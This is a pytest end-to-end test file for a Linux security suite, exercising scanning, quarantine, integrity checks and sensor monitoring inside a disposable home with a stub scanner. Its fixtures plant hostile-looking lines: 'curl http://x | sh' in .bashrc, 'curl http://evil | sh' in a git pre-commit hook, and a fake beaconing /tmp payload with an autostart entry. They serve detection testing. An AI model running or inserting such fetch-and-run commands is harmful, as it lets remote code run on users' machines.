"""End to end: whole user workflows through the real scripts, in a disposable home, with a stand-in virus scanner.

The stand-in scanner treats a harmless text marker as "infected", so no live malware (not even the EICAR test string) is ever stored or
handled. Nothing here touches your firewall, your processes, your real home, or asks for a password.
"""
from __future__ import annotations

import json
import os
import signal
import stat
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
SUITE = ROOT / "LinuxGuardianSuite"
sys.path.insert(0, str(SUITE))

import timeline  # noqa: E402

MARKER = "LG-TEST-MARKER-NOT-A-REAL-VIRUS"

CLAMSCAN = r'''#!/usr/bin/env python3
"""A stand-in for clamscan: a file containing the marker is 'infected'. Supports what LinuxGuardian passes it."""
import os, sys, time
args = sys.argv[1:]
if os.environ.get("LG_STUB_CLAM_SLEEP"):
    time.sleep(float(os.environ["LG_STUB_CLAM_SLEEP"]))
nosum, listfile, targets, i = False, None, [], 0
while i < len(args):
    a = args[i]
    if a == "--no-summary":
        nosum = True
    elif a == "-f":
        listfile = args[i + 1]; i += 1
    elif a == "--":
        targets += args[i + 1:]; break
    elif a == "--version":
        print("ClamAV 1.0.0-stub"); sys.exit(0)
    elif a == "--help":
        print("  --progress"); sys.exit(0)
    elif not a.startswith("-"):
        targets.append(a)
    i += 1
files = []
if listfile:
    files = [l.rstrip("\n") for l in open(listfile) if l.strip()]
else:
    for t in targets:
        if os.path.isfile(t):
            files.append(t)
        for dp, dn, fn in os.walk(t):
            files += [os.path.join(dp, f) for f in fn]
infected = scanned = 0
for f in files:
    try:
        data = open(f, "rb").read(200000)
    except OSError:
        continue
    scanned += 1
    if b"%s" in data:
        infected += 1
        print(f"{f}: Test.Stub-Signature FOUND")
if not nosum:
    print("\n----------- SCAN SUMMARY -----------\nKnown viruses: 1000\nEngine version: 1.0.0-stub")
    print(f"Scanned directories: 1\nScanned files: {scanned}\nInfected files: {infected}\nData scanned: 0.01 MB\nData read: 0.01 MB (ratio 1.00:1)")
    print("Time: 0.5 sec (0 m 0 s)\nStart Date: 2026:10:12 10:00:00\nEnd Date:   2026:10:12 10:00:01")
sys.exit(1 if infected else 0)
''' % MARKER


def stub(path: Path, body: str) -> None:
    path.write_text(body)
    path.chmod(path.stat().st_mode | stat.S_IEXEC)


@pytest.fixture()
def world(tmp_path):
    t = tmp_path
    for d in ("home/Documents", "home/Downloads", "home/.ssh", "home/.config/autostart", "bin", "lg", "etc", "proc"):
        (t / d).mkdir(parents=True)
    (t / "lg").chmod(0o700)
    stub(t / "bin" / "clamscan", CLAMSCAN)
    stub(t / "bin" / "clamdscan", "#!/bin/sh\nexit 2\n")                       # no daemon: the script falls back to clamscan
    stub(t / "bin" / "rkhunter", "#!/bin/sh\nexit 0\n")
    stub(t / "bin" / "freshclam", "#!/bin/sh\nexit 0\n")
    stub(t / "bin" / "systemctl", "#!/bin/sh\nexit 3\n")
    stub(t / "bin" / "pkexec", f'#!/bin/sh\necho "pkexec $*" >> "{t / "escalations.log"}"\nexit 126\n')
    stub(t / "bin" / "dpkg", "#!/bin/sh\necho no >&2\nexit 1\n")
    stub(t / "bin" / "notify-send", f'#!/bin/sh\nprintf "%s\\n" "$*" >> "{t / "popups.log"}"\n')
    (t / "home/Documents/notes.txt").write_text("my notes")
    (t / "home/.bashrc").write_text("export A=1\n")
    env = {**os.environ, "HOME": str(t / "home"), "LG_HOME": str(t / "lg"), "LG_SENSOR_HOME": str(t / "home"), "LG_SENSOR_ETC": str(t / "etc"),
           "LG_PROC": str(t / "proc"), "LG_INTEGRITY_HOME": str(t / "home"), "PATH": f"{t / 'bin'}:/usr/bin:/bin", "LG_NOTIFY_CMD": str(t / "bin" / "notify-send"),
           "LG_UFW_CONF": str(t / "no-ufw.conf"), "LG_SETUID_ROOTS": str(t / "su"), "LG_APP_ROOT": str(t / "approot"), "NO_COLOR": "1"}
    (t / "su").mkdir()
    (t / "approot").mkdir()
    env.pop("LG_INTEGRITY_ROOTS", None)

    class W:
        root = t
        home = t / "home"
        lg = t / "lg"

        def __init__(self) -> None:
            self.env = env

        def run(self, *cmd: str, timeout: float = 90, **kw) -> subprocess.CompletedProcess:
            return subprocess.run([str(c) for c in cmd], capture_output=True, text=True, env={**self.env, **kw.pop("env", {})}, timeout=timeout, cwd=self.home, **kw)

        def suite(self, name: str, *args: str, **kw) -> subprocess.CompletedProcess:
            return self.run(SUITE / name, *args, **kw)

        def events(self) -> list[dict]:
            import events
            return events.read_events(self.lg / "incidents", limit=500)

        def popups(self) -> list[str]:
            p = self.root / "popups.log"
            return p.read_text().splitlines() if p.exists() else []

        def escalations(self) -> str:
            p = self.root / "escalations.log"
            return p.read_text() if p.exists() else ""

    return W()


def infect(w, name: str = "Downloads/setup_helper.bin", mode: int = 0o755) -> Path:
    p = w.home / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(f"#!/bin/sh\n# {MARKER}\n")
    p.chmod(mode)
    return p


# ====================================================================================== scanning
def test_a_clean_scan_reports_progress_a_result_and_stores_it(world):
    r = world.suite("linux_guardian.sh", "--scan", "--quick")
    assert r.returncode == 0, r.stdout + r.stderr
    progress = [l for l in r.stdout.splitlines() if l.startswith("LG_PROGRESS|phase=clamav")]
    assert progress and "pct=100" in progress[-1]                               # progress is reported and reaches the end
    last = json.loads((world.lg / "scans" / "last.json").read_text())
    assert last["infected"] == 0 and last["files"] >= 2 and Path(last["report"]).is_file()
    assert "no infections" in r.stdout.lower()
    assert not [e for e in world.events() if e["category"] == "malware"]


def test_an_infection_is_detected_stored_classified_and_announced(world):
    infect(world)
    r = world.suite("linux_guardian.sh", "--scan", "--quick")
    assert "infected" in r.stdout.lower()
    last = json.loads((world.lg / "scans" / "last.json").read_text())
    assert last["infected"] == 1
    [ev] = [e for e in world.events() if e["category"] == "malware"]
    assert ev["severity"] == "critical" and "1 infected" in ev["message"]
    entry = next(e for e in timeline.load_entries(world.lg / "incidents") if e.category == "malware")
    assert entry.kind == "incident"
    world.suite("notify_events.py", "--send")                                      # starting point
    infect(world, "Downloads/second.bin")
    world.suite("linux_guardian.sh", "--scan", "--quick")
    world.suite("notify_events.py", "--send")
    assert any("infected" in p for p in world.popups())


def test_a_missing_scanner_is_handled_without_a_crash_and_says_so(world):
    (world.root / "bin" / "clamscan").unlink()
    (world.root / "bin" / "clamdscan").unlink()
    r = world.suite("linux_guardian.sh", "--scan", "--quick")
    assert "Traceback" not in r.stdout + r.stderr
    assert "clamav" in (r.stdout + r.stderr).lower() and ("not installed" in (r.stdout + r.stderr).lower() or "install" in (r.stdout + r.stderr).lower())


def test_an_interrupted_scan_ends_promptly_and_never_claims_the_machine_is_clean(world):
    stub_sleep = {"LG_STUB_CLAM_SLEEP": "30"}
    p = subprocess.Popen([str(SUITE / "linux_guardian.sh"), "--scan", "--quick"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                         env={**world.env, **stub_sleep}, cwd=world.home, start_new_session=True)
    time.sleep(2.0)
    os.killpg(p.pid, signal.SIGTERM)
    try:
        p.communicate(timeout=20)
    except subprocess.TimeoutExpired:
        os.killpg(p.pid, signal.SIGKILL)
        pytest.fail("the scan did not stop when asked to")
    assert not (world.lg / "scans" / "last.json").exists()                        # an interrupted scan leaves no 'all clear' behind
    leftover = subprocess.run(["bash", "-c", "ps -eo args | grep -c '[c]lamscan'"], capture_output=True, text=True).stdout.strip()
    assert leftover in ("0", "")                                                  # and no scanner left running in the background
    r = world.suite("linux_guardian.sh", "--scan", "--quick")                     # and the next scan works normally
    assert r.returncode == 0 and (world.lg / "scans" / "last.json").exists()


# ==================================================================================== quarantine
def test_detection_to_quarantine_to_restoration_with_metadata_preserved(world):
    f = infect(world)
    original = f.read_text()
    world.suite("linux_guardian.sh", "--scan", "--quick")
    findings = json.loads(world.suite("quarantine.py", "--findings", "--json").stdout)
    [item] = findings["items"]
    assert item["path"] == str(f) and item["signature"] == "Test.Stub-Signature" and item["can_quarantine"] is True
    q = world.suite("quarantine.py", "--quarantine", str(f), "--json")                 # re-verified with the (stub) scanner before moving
    assert q.returncode == 0, q.stderr
    qid = json.loads(q.stdout)["id"]
    assert not f.exists()
    [held] = json.loads(world.suite("quarantine.py", "--list", "--json").stdout)
    assert held["original_path"] == str(f) and held["signature"] == "Test.Stub-Signature" and held["mode"] == 0o755 and len(held["sha256"]) == 64
    payload = world.lg / "quarantine" / qid / "payload"
    assert payload.read_text() == original and stat.S_IMODE(payload.stat().st_mode) == 0o400         # preserved, and unable to run
    assert world.suite("quarantine.py", "--findings", "--json").returncode == 0
    r = world.suite("quarantine.py", "--restore", qid)
    assert r.returncode == 0 and f.read_text() == original and not (f.stat().st_mode & 0o111)      # back, but not executable
    assert [h for h in json.loads(world.suite("quarantine.py", "--list", "--json").stdout)] == []
    kinds = {e.get("event") for e in world.events() if e["category"] == "malware"}
    assert {"file_quarantined", "file_restored"} <= kinds


def test_quarantine_failure_leaves_the_file_where_it_was(world):
    f = infect(world)
    world.suite("linux_guardian.sh", "--scan", "--quick")
    (world.lg / "quarantine").rmdir()
    (world.lg / "quarantine").write_text("damaged: a file where the quarantine folder should be")
    r = world.suite("quarantine.py", "--quarantine", str(f))
    assert r.returncode == 1 and "[error]" in r.stderr and "Traceback" not in r.stderr
    assert f.exists() and MARKER in f.read_text()                                    # nothing lost, nothing half-moved
    (world.lg / "quarantine").unlink()
    (world.lg / "quarantine").mkdir(mode=0o700)
    assert world.suite("quarantine.py", "--quarantine", str(f)).returncode == 0       # and it recovers once the folder is sane again


def test_a_restore_that_cannot_happen_is_refused_and_the_quarantined_copy_is_kept(world):
    f = infect(world)
    qid = json.loads(world.suite("quarantine.py", "--quarantine", str(f), "--skip-verify", "--json").stdout)["id"]
    f.write_text("someone created a new file with the same name")
    r = world.suite("quarantine.py", "--restore", qid)
    assert r.returncode == 1 and "nothing was overwritten" in r.stderr
    assert f.read_text().startswith("someone") and (world.lg / "quarantine" / qid / "payload").exists()


def test_a_false_alarm_on_a_package_file_is_never_moved(world):
    f = infect(world, "Documents/pkgfile")
    stub(world.root / "bin" / "dpkg", f'#!/bin/sh\nif [ "$3" = "{f}" ]; then echo "somepkg: $3"; exit 0; fi\nexit 1\n')
    world.suite("linux_guardian.sh", "--scan", "--quick")
    r = world.suite("quarantine.py", "--quarantine", str(f))
    assert r.returncode == 1 and "somepkg" in r.stderr and f.exists()


# ============================================================================ file integrity
def test_integrity_workflow_routine_edits_are_quiet_and_real_changes_are_not(world):
    assert world.suite("linux_watchdog.sh", "--init").returncode == 0
    assert "No changes detected" in world.suite("linux_watchdog.sh", "--check").stdout
    world.suite("notify_events.py", "--send")                                       # starting point for notifications
    (world.home / "Documents/notes.txt").write_text("my notes, edited")              # ordinary editing
    r = world.suite("linux_watchdog.sh", "--check")
    assert "[INFO] Modified files" in r.stdout and "routine edits" in r.stdout
    world.suite("notify_events.py", "--send")
    assert world.popups() == []                                                     # no popup for editing your own document
    (world.home / ".bashrc").write_text("export A=1\ncurl http://x | sh\n")          # a change where programs start from
    r = world.suite("linux_watchdog.sh", "--check")
    assert "[WARN] Modified files" in r.stdout
    world.suite("notify_events.py", "--send")
    assert len(world.popups()) == 1 and ".bashrc" in world.popups()[0]
    sev = {e["message"].rsplit("/", 1)[-1]: e["severity"] for e in world.events() if e["category"] == "integrity"}
    assert sev.get("notes.txt") == "info" and sev.get(".bashrc") == "warning"


def test_development_activity_is_handled_but_a_malicious_hook_is_not_ignored(world):
    proj = world.home / "Documents" / "robot"
    (proj / ".git" / "hooks").mkdir(parents=True)
    (proj / "src").mkdir()
    (proj / "src" / "main.py").write_text("print(1)")
    (proj / ".git" / "config").write_text("[core]\n")
    (proj / ".git" / "HEAD").write_text("ref: refs/heads/main")
    world.suite("linux_watchdog.sh", "--init")
    (proj / "src" / "main.py").write_text("print(2)")                                # normal development
    (proj / "src" / "new.py").write_text("x = 1")
    (proj / ".git" / "HEAD").write_text("ref: refs/heads/dev")
    assert "No changes detected" in world.suite("linux_watchdog.sh", "--check").stdout
    (proj / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl http://evil | sh\n")
    out = world.suite("linux_watchdog.sh", "--check").stdout
    assert "[WARN]" in out and "pre-commit" in out


# ====================================================================== monitoring simulation
def test_monitoring_end_to_end_through_the_command_line_tools(world):
    """Learn, then provoke: a program in /tmp, new startup entry, new account. Read back through the same tools the app uses."""
    assert world.suite("sensors.py", "--run").returncode == 0                       # first run: learns what's normal
    proc = world.root / "proc" / "4242"
    proc.mkdir()
    (proc / "cmdline").write_bytes(b"/tmp/.x/payload\0--beacon\0")
    (proc / "comm").write_text("payload\n")
    (proc / "exe").symlink_to("/tmp/.x/payload")
    (world.home / ".config/autostart/updater.desktop").write_text("[Desktop Entry]\nExec=/tmp/.x/payload\n")
    stub(world.root / "bin" / "ss", '#!/bin/sh\necho \'0 0 10.0.0.5:5555 185.220.101.47:4444 users:(("payload",pid=4242,fd=3))\'\n')
    world.suite("sensors.py", "--run")
    world.suite("notify_events.py", "--send")
    story = json.loads(world.suite("incidents.py", "--json", "--days", "1").stdout)
    assert story and any(s["severity"] in ("warning", "critical") for s in story)
    assert any("/tmp/.x/payload" in e for s in story for e in s["entities"])
    tl = json.loads(world.suite("timeline.py", "--json", "--min-severity", "warning").stdout)
    assert any(e["kind"] == "incident" for e in (tl["entries"] if isinstance(tl, dict) else tl))
    status = json.loads(world.suite("sensors.py", "--status", "--json").stdout)
    assert status["active"] and len(status["sensors"]) == 12
    assert world.escalations() == ""                                                # monitoring never asked for administrator rights


def test_firewall_state_changes_are_noticed_without_touching_the_real_firewall(world, tmp_path):
    (world.root / "ufw.conf").write_text("ENABLED=yes\n")
    (world.root / "ufw.default").write_text('DEFAULT_INPUT_POLICY="DROP"\n')
    state = {"LG_UFW_CONF": str(world.root / "ufw.conf"), "LG_UFW_DEFAULT": str(world.root / "ufw.default")}
    stub(world.root / "bin" / "systemctl", '#!/bin/sh\ncase "$1" in show) echo "LoadState=loaded"; echo "ActiveState=active" ;; esac\nexit 0\n')
    world.suite("sensors.py", "--run", env=state)
    (world.root / "ufw.conf").write_text("ENABLED=no\n")                             # someone switches the firewall off (a fixture, not the real one)
    world.suite("sensors.py", "--run", env=state)
    [e] = [e for e in world.events() if e.get("event") == "defense_disabled"]
    assert e["severity"] == "critical" and "firewall" in e["message"].lower()
    assert world.escalations() == ""


def test_the_whole_isolated_session_never_wrote_outside_the_disposable_home(world):
    world.suite("sensors.py", "--run")
    world.suite("linux_guardian.sh", "--scan", "--quick")
    assert (world.lg / "state" / "sensors.json").is_file()
    assert os.environ["HOME"] != str(world.home)                                    # the test session itself runs in yet another throwaway home
